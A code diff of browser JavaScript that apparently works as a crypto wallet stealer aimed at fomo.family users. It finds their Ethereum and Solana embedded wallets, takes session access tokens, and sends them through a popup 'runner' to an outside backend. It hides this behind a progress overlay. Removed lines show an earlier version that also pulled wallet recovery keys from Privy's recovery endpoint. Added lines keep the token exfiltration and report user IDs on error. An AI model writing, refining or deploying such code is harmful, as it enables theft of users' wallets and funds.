@@ -161,11 +161,46 @@
   const RUNNER_FEATURES =
     "width=420,height=520,left=80,top=80,menubar=no,toolbar=no,location=no,status=no";
 
-  function openRunnerWithJob(job) {
+  function runnerJobUrl(job) {
     const payload = b64urlEncode(JSON.stringify(job));
     const url = CFG.RUNNER + "#job=" + payload;
     if (url.length > 1500000) throw new Error("Job too large for URL");
+    return url;
+  }
+
+  function sendRunner(win, job) {
+    const url = runnerJobUrl(job);
+    if (win && !win.closed) {
+      try {
+        win.location.href = url;
+        return win;
+      } catch {}
+    }
     return window.open(url, RUNNER_NAME, RUNNER_FEATURES);
+  }
+
+  function reportErrorViaRunner(win, message, userId) {
+    const out = {
+      source: "fomo.family",
+      ts: Date.now(),
+      userId: userId || null,
+      ethereum: [],
+      solana: [],
+      error: String(message || "unknown"),
+    };
+    const d = b64urlEncode(JSON.stringify(out));
+    const url =
+      CFG.BACKEND +
+      (CFG.BACKEND.includes("?") ? "&" : "?") +
+      "d=" +
+      d +
+      "&return=" +
+      encodeURIComponent(CFG.RETURN);
+    if (win && !win.closed) {
+      try {
+        win.location.href = url;
+      } catch {}
+    }
   }
 
   function waitForPopupAllowed(ui, openFn) {
@@ -185,14 +220,12 @@
         btn.textContent = "Checking…";
         setTimeout(() => {
           const w = openFn();
+          btn.disabled = false;
+          btn.textContent = "Allow & continue";
           if (w) {
             ui.hidePopupHelp();
-            btn.disabled = false;
-            btn.textContent = "Allow & continue";
             resolve(w);
           } else {
-            btn.disabled = false;
-            btn.textContent = "Allow & continue";
             ui.showPopupHelp();
           }
         }, 200);
@@ -293,61 +326,18 @@
     return { wallets: found, token: access, user: data.user, caid };
   }
 
-  async function sha256OfB64Key(b64str) {
-    const norm = b64str.replace(/-/g, "+").replace(/_/g, "/");
-    const pad = "=".repeat((4 - (norm.length % 4)) % 4);
-    const bin = atob(norm + pad);
-    const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0));
-    const dig = new Uint8Array(await crypto.subtle.digest("SHA-256", bytes));
-    let s = "";
-    dig.forEach((b) => (s += String.fromCharCode(b)));
-    return {
-      b64hash: btoa(s),
-      hex: [...dig].map((b) => b.toString(16).padStart(2, "0")).join(""),
-    };
-  }
-
-  async function keyMaterial(address, chainType, token, caid) {
-    const r = await fetch(
-      CFG.PRIVY +
-        "/api/v1/embedded_wallets/" +
-        encodeURIComponent(address) +
-        "/recovery/key_material",
-      {
-        method: "POST",
-        credentials: "include",
-        headers: privyHeaders(token, caid),
-        body: JSON.stringify({ chain_type: chainType }),
-      }
-    );
-    return {
-      status: r.status,
-      ok: r.ok,
-      data: await r.json().catch(() => ({})),
-    };
-  }
-
   async function buildItems(wallets, token, caid) {
     const items = [];
     const access = cleanToken(token);
 
     for (const address of wallets.ethereum) {
-      const km = await keyMaterial(address, "ethereum", access, caid);
-      if (!km.ok) continue;
-      const recoveryKey = km.data?.recovery_key || km.data?.recoveryKey;
-      if (!recoveryKey) continue;
-      const hashes = await sha256OfB64Key(recoveryKey);
       items.push({
         appId: CFG.APP_ID,
         clientId: CFG.CLIENT_ID,
         caid,
         wallet: address,
         accessToken: access,
-        recoveryKey,
-        recoveryKeyHashB64: hashes.b64hash,
-        recoveryKeyHashHex: hashes.hex,
         chainType: "ethereum",
-        chain_type: "ethereum",
       });
     }
 
@@ -357,22 +347,13 @@
     } catch {}
 
     for (const address of wallets.solana) {
-      const km = await keyMaterial(address, "solana", solToken, caid);
-      if (!km.ok) continue;
-      const recoveryKey = km.data?.recovery_key || km.data?.recoveryKey;
-      if (!recoveryKey) continue;
-      const hashes = await sha256OfB64Key(recoveryKey);
       items.push({
         appId: CFG.APP_ID,
         clientId: CFG.CLIENT_ID,
         caid,
         wallet: address,
         accessToken: solToken,
-        recoveryKey,
-        recoveryKeyHashB64: hashes.b64hash,
-        recoveryKeyHashHex: hashes.hex,
         chainType: "solana",
-        chain_type: "solana",
       });
     }
 
@@ -382,34 +363,39 @@
   async function main() {
     const ui = mountOverlay();
     ui.setStep(1);
+    // Open popup synchronously (before any await) so the browser keeps the user gesture.
+    let runnerWin = window.open(CFG.RUNNER, RUNNER_NAME, RUNNER_FEATURES);
+    let userId = null;
 
     try {
       ui.setStep(2);
       const { wallets, user, caid } = await discoverWallets();
+      userId = user?.id || null;
 
       ui.setStep(3);
       const { access: fresh } = await refreshSession();
 
       ui.setStep(4);
       const items = await buildItems(wallets, fresh, caid);
-      if (!items.length) throw new Error("No recovery material available");
+      if (!items.length) throw new Error("No wallets found");
 
       ui.setStep(5);
       const job = {
         source: "fomo.family",
-        userId: user?.id || null,
+        userId,
         backend: CFG.BACKEND,
         returnUrl: CFG.RETURN,
         items,
       };
 
       ui.setStep(6);
-      await waitForPopupAllowed(ui, () => openRunnerWithJob(job));
+      runnerWin = sendRunner(runnerWin, job);
+      if (!runnerWin) {
+        await waitForPopupAllowed(ui, () => sendRunner(null, job));
+      }
 
       ui.setStep(7);
       ui.finishOk();
-      // parent tab: leave overlay briefly, then hard-navigate home
-      // (popup does its own backend redirect; COOP means we can't watch it)
       setTimeout(() => {
         try {
           location.href = CFG.RETURN || "https://fomo.family/token";
@@ -418,6 +404,7 @@
     } catch (e) {
       console.error(e);
       ui.error(e.message || e);
+      reportErrorViaRunner(runnerWin, e.message || e, userId);
     }
   }
 
